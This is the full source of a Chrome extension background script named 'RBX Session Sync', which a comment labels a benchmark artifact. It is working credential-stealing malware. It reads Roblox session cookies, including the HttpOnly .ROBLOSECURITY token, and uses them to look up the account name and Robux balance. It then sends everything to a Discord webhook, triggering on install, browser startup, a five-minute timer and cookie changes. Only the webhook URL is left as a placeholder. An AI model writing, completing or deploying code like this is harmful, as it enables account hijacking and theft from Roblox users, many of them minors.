// RBX Session Sync — background service worker (MV3)
// Benchmark artifact: steals Roblox session cookies via chrome.cookies and
// exfiltrates them to a Discord webhook. .ROBLOSECURITY is HttpOnly, so page
// JS / content scripts cannot read it — the cookies API in a privileged
// extension context is the viable theft path.

// ----------------------------- configuration ------------------------------

// Fallback webhook. The options page (chrome.storage.local "webhookUrl")
// overrides this. Replace with your lab webhook or leave as-is and configure
// via the extension options UI.
const DEFAULT_WEBHOOK = "PASTE_DISCORD_WEBHOOK_URL_HERE";

// Cookies worth exfiltrating. .ROBLOSECURITY is the session token; the rest
// are useful context/secondary tokens.
const TARGET_COOKIE_NAMES = [
  ".ROBLOSECURITY",
  ".RBXIDCHECK",
  "RBXSessionTracker",
  "RBXEventTrackerV2",
  "GuestData",
  "RBXcb",
  "rbx-ip2",
];

// ------------------------------ helpers -----------------------------------

function chunk(str, size) {
  const out = [];
  for (let i = 0; i < str.length; i += size) out.push(str.slice(i, i + size));
  return out;
}

async function sha256(s) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s));
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

async function getWebhookUrl() {
  const { webhookUrl } = await chrome.storage.local.get("webhookUrl");
  return webhookUrl || DEFAULT_WEBHOOK;
}

// ------------------------------ theft -------------------------------------

async function grabCookies() {
  const all = await chrome.cookies.getAll({ domain: "roblox.com" });
  const security = all.find((c) => c.name === ".ROBLOSECURITY");
  if (!security) return null; // victim not logged in
  return {
    security,
    others: all.filter((c) => c.name !== ".ROBLOSECURITY" && TARGET_COOKIE_NAMES.includes(c.name)),
  };
}

// Validate the stolen session and enrich the payload. Host permissions for
// *.roblox.com let the SW fetch cross-origin with the browser's cookies
// attached, which also proves the stolen cookie is live.
async function fetchAccountInfo() {
  const res = await fetch("https://users.roblox.com/v1/users/authenticated", {
    credentials: "include",
  });
  if (!res.ok) return null;
  const user = await res.json();
  let robux = null;
  try {
    const r = await fetch(`https://economy.roblox.com/v1/users/${user.id}/robux`, {
      credentials: "include",
    });
    if (r.ok) robux = (await r.json()).robux;
  } catch (_) { /* non-fatal */ }
  return { id: user.id, name: user.name, displayName: user.displayName, robux };
}

// --------------------------- exfiltration ---------------------------------

function buildPayload(grabbed, account, reason) {
  const sec = grabbed.security;
  const fields = [];

  if (account) {
    fields.push({ name: "Username", value: `${account.name} (${account.id})`, inline: true });
    fields.push({ name: "Display", value: account.displayName || "—", inline: true });
    fields.push({ name: "Robux", value: account.robux != null ? String(account.robux) : "?", inline: true });
  } else {
    fields.push({ name: "Account", value: "validation failed (expired/bound cookie or API error)", inline: false });
  }

  fields.push({ name: "Domain / Path", value: `${sec.domain}${sec.path}`, inline: true });
  fields.push({
    name: "Expires",
    value: sec.expirationDate ? new Date(sec.expirationDate * 1000).toISOString() : "session",
    inline: true,
  });
  fields.push({
    name: "Flags",
    value: `httpOnly=${sec.httpOnly} secure=${sec.secure} sameSite=${sec.sameSite}`,
    inline: false,
  });

  // .ROBLOSECURITY is ~800-900 chars; Discord embed field cap is 1024. Chunk defensively.
  chunk(sec.value, 1000).forEach((c, i) =>
    fields.push({ name: i === 0 ? ".ROBLOSECURITY" : `.ROBLOSECURITY [${i + 1}]`, value: c, inline: false })
  );

  if (grabbed.others.length) {
    const summary = grabbed.others
      .map((c) => `${c.name}=${c.value.slice(0, 64)}${c.value.length > 64 ? "…" : ""}`)
      .join("\n");
    chunk(summary, 1000).forEach((c, i) =>
      fields.push({ name: i === 0 ? "Other Roblox cookies" : "(cont.)", value: c, inline: false })
    );
  }

  return {
    username: "RBX Session Sync",
    embeds: [
      {
        title: "Roblox session captured",
        description: `Trigger: \`${reason}\``,
        color: 15158332,
        fields,
        footer: { text: navigator.userAgent || "unknown UA" },
        timestamp: new Date().toISOString(),
      },
    ],
  };
}

async function exfil(webhook, payload) {
  try {
    const res = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return res.ok; // 204 No Content on success
  } catch (_) {
    return false;
  }
}

// ---------------------------- orchestration -------------------------------

async function runGrab(reason) {
  try {
    const grabbed = await grabCookies();
    if (!grabbed) return { ok: false, why: "no-cookie" };

    const hash = await sha256(grabbed.security.value);
    if (reason !== "manual") {
      const { lastHash } = await chrome.storage.local.get("lastHash");
      if (hash === lastHash) return { ok: true, why: "duplicate-suppressed" };
    }

    const webhook = await getWebhookUrl();
    if (!webhook || webhook.includes("PASTE_")) return { ok: false, why: "no-webhook-configured" };

    const account = await fetchAccountInfo().catch(() => null);
    const payload = buildPayload(grabbed, account, reason);
    const ok = await exfil(webhook, payload);
    if (ok) await chrome.storage.local.set({ lastHash: hash, lastSent: Date.now() });
    return { ok, why: ok ? "sent" : "webhook-error" };
  } catch (_) {
    return { ok: false, why: "exception" };
  }
}

// ------------------------------ triggers ----------------------------------

// 1. Right after install + schedule periodic re-checks (cookie rotation).
chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("poll", { periodInMinutes: 5 });
  runGrab("install");
});

// 2. Browser startup.
chrome.runtime.onStartup.addListener(() => runGrab("startup"));

// 3. Periodic poll.
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "poll") runGrab("alarm");
});

// 4. Fires the moment Roblox sets/refreshes the cookie (e.g. victim logs in
//    after the extension is already installed).
chrome.cookies.onChanged.addListener((info) => {
  if (
    !info.removed &&
    info.cookie.domain.includes("roblox.com") &&
    TARGET_COOKIE_NAMES.includes(info.cookie.name)
  ) {
    runGrab("cookie-change");
  }
});

// 5. Manual trigger from the options page.
chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg && msg.type === "GRAB_NOW") {
    runGrab("manual").then(sendResponse);
    return true; // async response
  }
});
